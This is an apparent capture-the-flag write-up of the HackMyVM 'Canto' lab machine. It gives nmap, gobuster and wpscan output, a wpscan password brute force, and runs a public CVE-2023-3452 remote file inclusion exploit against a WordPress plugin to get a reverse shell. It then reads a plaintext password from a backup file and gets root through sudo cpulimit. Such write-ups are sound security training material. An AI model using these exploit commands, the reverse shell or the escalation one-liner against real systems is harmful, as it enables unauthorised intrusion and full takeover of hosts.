@@ -1,1 +1,438 @@
+			ENUMERATION
+			
+
+---nmap---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.75 -sS -sC -sV -A -T4 -p-    
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-09 21:40 +03
+Nmap scan report for 10.0.2.75
+Host is up (0.00074s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 c6:af:18:21:fa:3f:3c:fc:9f:e4:ef:04:c9:16:cb:c7 (ECDSA)
+|_  256 ba:0e:8f:0b:24:20:dc:75:b7:1b:04:a1:81:b6:6d:64 (ED25519)
+80/tcp open  http    Apache httpd 2.4.57 ((Ubuntu))
+|_http-server-header: Apache/2.4.57 (Ubuntu)
+|_http-generator: WordPress 6.5.3
+|_http-title: Canto
+MAC Address: 08:00:27:C3:DF:3E (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.74 ms 10.0.2.75
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 46.52 seconds
+           
+
+
+
+--- The web site is made with wordpress, lets do some directory scanning ---
+
+
+
+--- gobuster ---
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# gobuster dir -u http://10.0.2.75 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,txt,php,jpg
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.75
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,txt,php,jpg
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 274]
+/.html                (Status: 403) [Size: 274]
+/index.php            (Status: 301) [Size: 0] [--> http://10.0.2.75/]
+/wp-content           (Status: 301) [Size: 311] [--> http://10.0.2.75/wp-content/]
+/wp-login.php         (Status: 200) [Size: 5059]
+/license.txt          (Status: 200) [Size: 19915]
+/wp-includes          (Status: 301) [Size: 312] [--> http://10.0.2.75/wp-includes/]
+/readme.html          (Status: 200) [Size: 7401]
+/wp-trackback.php     (Status: 200) [Size: 135]
+/wp-admin             (Status: 301) [Size: 309] [--> http://10.0.2.75/wp-admin/]
+/xmlrpc.php           (Status: 405) [Size: 42]
+/.html                (Status: 403) [Size: 274]
+/.php                 (Status: 403) [Size: 274]
+/wp-signup.php        (Status: 302) [Size: 0] [--> http://10.0.2.75/wp-login.php?action=register]
+/server-status        (Status: 403) [Size: 274]
+Progress: 1102800 / 1102805 (100.00%)
+===============================================================
+Finished
+===============================================================
+                             
+
+http://10.0.2.75/wp-admin/user
+
+
+
+--- I checked all the directories and dug deeper because I saw the login.php? and taught of a LFI/RCE exploit
+but not much came from there ---
+
+
+--- this is a wordpress website so I seach for ways to scan it further, maybe there is an exploit for this version ---
+
+
+--- By searching I find that there is a tool we can use to get more info about the website, wp-scan ---
+
+
+                                                                                               
+┌──(root㉿kali)-[/home/okina]
+└─# wpscan --url 'http://10.0.2.75/' -e u                                                     
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.25
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.0.2.75/ [10.0.2.75]
+[+] Started: Sun Jun  9 22:57:47 2024
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.57 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+.
+.
+.
+.
+.
+.
+
+[i] User(s) Identified:
+
+[+] erik
+ | Found By: Rss Generator (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://10.0.2.75/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Sun Jun  9 22:57:49 2024
+[+] Requests Done: 53
+[+] Cached Requests: 6
+[+] Data Sent: 13.812 KB
+[+] Data Received: 243.5 KB
+[+] Memory used: 169.406 MB
+[+] Elapsed time: 00:00:02
+                                                
+
+
+--- here we discover the username "erik" ---
+
+
+--- I tried utilizing bruteforce attacks but it didn't work ---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# wpscan --url http://10.0.2.75 --usernames erik --passwords wordlists/rockyou.txt
+.
+.
+.
+.
+.
+.
+.
+
+Didn't work :(
+
+
+
+
+--- So I started searching for other ways, I change my perspective --- 
+
+
+
+--- I searched for the name of the ctf machine "canto" along with wordpress, turns out ---
+
+Canto: A digital asset management system
+
+
+
+
+--- I searched fo a possible exploit by searching "canto wordpress exploit" and found one ---
+
+https://github.com/leoanggal1/CVE-2023-3452-PoC
+
+
+
+--- Download CVE-2023-3452-PoC exploit ---
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/43- CANTO LINUX CTF]
+└─# git clone https://github.com/leoanggal1/CVE-2023-3452-PoC.git
+Cloning into 'CVE-2023-3452-PoC'...
+remote: Enumerating objects: 88, done.
+remote: Counting objects: 100% (88/88), done.
+remote: Compressing objects: 100% (87/87), done.
+remote: Total 88 (delta 26), reused 0 (delta 0), pack-reused 0
+Receiving objects: 100% (88/88), 199.77 KiB | 1.15 MiB/s, done.
+Resolving deltas: 100% (26/26), done.
+
+
+--- in the readme it says ---
+
+"The Canto plugin for WordPress is vulnerable to Remote File Inclusion in versions up to, 
+and including, 3.0.4 via the 'wp_abspath' parameter. This allows unauthenticated attackers 
+to include and execute arbitrary remote code on the server, provided that allow_url_include 
+is enabled. Local File Inclusion is also possible"
+
+
+
+
+--- now I run the exploit by utilizing a reverse shell file, the ip and port values of my reverse shell is ---
+
+$ip = '10.0.2.54';  // CHANGE THIS
+$port = 4444;  
+
+
+
+Note: You can use the reverse web shells that comes within kali
+
+
+                                                                                                                        
+┌──(root㉿kali)-[/home/…/NOTLAR/HACKMYVM/43- CANTO LINUX CTF/CVE-2023-3452-PoC]
+└─# python3 CVE-2023-3452.py -u http://10.0.2.75 -LHOST 10.0.2.54 -NC_PORT 4444 -s /home/okina/rev.php 
+
+
+--- this exploit automatically creates a reverse shell session for us, the exploit has netcat inside of it also 
+so we don't need to set up a listener ---   
+
+
+
+
+
+			GAINING FOOTHOLD
+
+			
+┌──(root㉿kali)-[/home/…/NOTLAR/HACKMYVM/43- CANTO LINUX CTF/CVE-2023-3452-PoC]
+└─# python3 CVE-2023-3452.py -u http://10.0.2.75 -LHOST 10.0.2.54 -NC_PORT 4444 -s /home/okina/rev.php 
+Local web server on port 8080...
+Exploitation URL: http://10.0.2.75/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://10.0.2.54:8080&cmd=whoami
+listening on [any] 4444 ...
+10.0.2.75 - - [09/Jun/2024 23:47:38] "GET /wp-admin/admin.php HTTP/1.1" 200 -
+10.0.2.75: inverse host lookup failed: Unknown host
+connect to [10.0.2.54] from (UNKNOWN) [10.0.2.75] 56886
+Linux canto 6.5.0-28-generic #29-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 28 23:46:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+ 20:47:38 up  2:13,  0 user,  load average: 0.00, 0.12, 0.98
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+
+$ python3 -c 'import pty;pty.spawn("/bin/bash")';
+www-data@canto:/$ 
+
+
+--- we are in as the www-data, let's look around ---
+
+
+www-data@canto:/home$ ls
+ls
+erik
+
+www-data@canto:/home$ cd erik
+cd erik
+
+www-data@canto:/home/erik$ ls
+ls
+notes  user.txt
+
+www-data@canto:/home/erik$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+
+www-data@canto:/home/erik$ ls -la
+ls -la
+total 36
+drwxr-xr-- 5 erik www-data 4096 May 12 13:56 .
+drwxr-xr-x 3 root root     4096 May 12 14:24 ..
+lrwxrwxrwx 1 root root        9 May 12 13:56 .bash_history -> /dev/null
+-rw-r--r-- 1 erik erik      220 Jan  7  2023 .bash_logout
+-rw-r--r-- 1 erik erik     3771 Jan  7  2023 .bashrc
+drwx------ 2 erik erik     4096 May 12 12:21 .cache
+drwxrwxr-x 3 erik erik     4096 May 12 12:03 .local
+-rw-r--r-- 1 erik erik      807 Jan  7  2023 .profile
+drwxrwxr-x 2 erik erik     4096 May 12 17:22 notes
+-rw-r----- 1 root erik       33 May 12 12:22 user.txt
+
+www-data@canto:/home/erik$ cd notes
+cd notes
+
+www-data@canto:/home/erik/notes$ ls
+ls
+Day1.txt  Day2.txt
+
+www-data@canto:/home/erik/notes$ ls -la
+ls -la
+total 16
+drwxrwxr-x 2 erik erik     4096 May 12 17:22 .
+drwxr-xr-- 5 erik www-data 4096 May 12 13:56 ..
+-rw-rw-r-- 1 erik erik       68 May 12 12:07 Day1.txt
+-rw-rw-r-- 1 erik erik       71 May 12 17:22 Day2.txt
+
+www-data@canto:/home/erik/notes$ cat Day1.txt	
+cat Day1.txt
+On the first day I have updated some plugins and the website theme.
+
+www-data@canto:/home/erik/notes$ cat Day2.txt
+cat Day2.txt
+I almost lost the database with my user so I created a backups folder.
+			
+			
+
+--- we got our clue, a folder named backups, lets search for it ---
+
+
+
+find / -name backups 2>/dev/null
+/snap/core22/1380/var/backups
+/snap/core22/864/var/backups
+/var/backups
+/var/wordpress/backups
+
+
+
+--- I check all these directories and eventually find something useful in /var/wordpress/backups ---
+
+
+www-data@canto:/var/backups$ cd /var/wordpress/backups
+cd /var/wordpress/backups
+
+www-data@canto:/var/wordpress/backups$ ls
+ls
+12052024.txt
+
+www-data@canto:/var/wordpress/backups$ cat 12052024.txt
+cat 12052024.txt
+------------------------------------
+| Users	    |      Password        |
+------------|----------------------|
+| erik      | th1sIsTheP3ssw0rd!   |
+------------------------------------
+
+
+
+--- Looks like we got our password, let's roll with ssh ---
+
+erik : th1sIsTheP3ssw0rd!
+
+
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# ssh erik@10.0.2.75
+The authenticity of host '10.0.2.75 (10.0.2.75)' can't be established.
+ED25519 key fingerprint is SHA256:jRCgzH5SXuNm8Cv3PUWt4FXgI74f7392+2lVl33dL2g.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.0.2.75' (ED25519) to the list of known hosts.
+erik@10.0.2.75's password: 
+
+
+*** System restart required ***
+Last login: Sun May 12 17:19:50 2024 from 192.168.1.163
+
+erik@canto:~$ ls
+notes  user.txt
+
+erik@canto:~$ cat user.txt
+---First User Flag---
+
+
+--- we got our first flag, let's search for ways to become root ---
+
+
+
+
+			
+			PRIVILEGE ESCALATION
+
+
+erik@canto:~$ sudo -l
+Matching Defaults entries for erik on canto:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User erik may run the following commands on canto:
+    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit
+
+
+
+--- our user can run the cpulimit command to become the root user ---
+
+
+cpulimit: A utility in Linux that is used to limit the CPU usage of a process. Can be useful if 
+you wanna ensure that a process does not consume too much CPU time, or if you gonna limit the 
+impact of a CPU-intensive process on the overall performance of the system.
+
+
+
+--- a quick visit to gtfobins to search for a priv escalate vector for cpulimit and we find it ---
+
+sudo cpulimit -l 100 -f /bin/sh
+
+
+
+--- edit it according to where our cpulimit file is and then execute the command ---
+
+
+erik@canto:~$ sudo /usr/bin/cpulimit -l 100 -f /bin/sh
+Process 69023 detected
+
+# whoami
+root
+
+# find / -name root.txt -type f 2>/dev/null
+/root/root.txt
+
+# cd /root
+
+# ls
+root.txt  snap
+
+# cat root.txt
+---Root User Flag---
+
+
+
+--- congrats, another machine bites the dust ---
+
+
 
